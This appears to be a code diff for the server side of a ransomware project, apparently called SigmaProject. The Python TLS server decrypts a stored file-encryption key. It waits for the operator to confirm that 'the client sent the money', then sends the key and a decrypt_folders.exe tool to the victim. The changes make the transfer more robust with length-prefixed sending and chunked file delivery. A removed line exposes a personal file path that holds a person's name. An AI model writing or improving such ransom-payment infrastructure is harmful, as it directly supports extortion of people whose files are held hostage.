@@ -2,6 +2,7 @@ import os
 import socket
 import sqlite3
 import ssl
+import struct
 from cryptography.fernet import Fernet
 HOST = '0.0.0.0'
 PORT = 8443
@@ -16,7 +17,10 @@ def create_socket():
     return sock
 def wrap_socket(socket):
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain(certfile=r"C:\Users\LiorCohen\OneDrive - fun flex ltd\משפחה\יהלי כהן\Projects\SigmaProject\Server Side\cert.pem", keyfile=r"C:\Users\LiorCohen\OneDrive - fun flex ltd\משפחה\יהלי כהן\Projects\SigmaProject\Server Side\key.pem")
+    BASE_PATH = os.path.dirname(os.path.abspath(__file__))
+    cert_file_path = os.path.join(BASE_PATH, "cert.pem")
+    key_file_path = os.path.join(BASE_PATH, "key.pem")
+    context.load_cert_chain(certfile=cert_file_path, keyfile=key_file_path)
     ssl_socket = context.wrap_socket(socket, server_side=True)
     return ssl_socket
 def save_encrypted_key_to_db(encryption_key, db_connection):
@@ -55,8 +59,8 @@ def main():
     db_conn = sqlite3.connect('encryption_key.db')
     encrypted_key = encrypt_key(encryption_key, MASTER_KEY)
     save_encrypted_key_to_db(encrypted_key, db_conn)
-    
     encrypt_key_from_db = get_encrypted_key_from_db(db_conn)
+    db_conn.close()
     decrypted_key = decrypt_key(encrypt_key_from_db, MASTER_KEY)
     print(f'Decrypted Key from DB: {decrypted_key.decode()}')
     money_send = False
@@ -64,12 +68,21 @@ def main():
         is_money_send = input("Has the client sent the money? (yes/no): ")
         if is_money_send.lower() == 'yes':
             money_send = True
-    conn.send(decrypted_key)
-    with open("dist\\decrypt_folders.exe", "rb") as f:
-        data = f.read()
-        conn.sendall(data)
+    key_len = len(decrypted_key)
+    conn.sendall(struct.pack("!I", key_len))
+    
+    conn.sendall(decrypted_key)
+    BASE_PATH = os.path.dirname(os.path.abspath(__file__))
+    decryptor_path = os.path.join(BASE_PATH, "dist", "decrypt_folders.exe")
+    with open(decryptor_path, "rb") as f:
+       while True:
+           chuck = f.read(4096)
+           if not chuck:
+               break
+           conn.sendall(chuck)
     print("Decryption tool sent to client.")
-        
+    
+    conn.close()
     server_socket.close()
 if __name__ == '__main__':
     main()
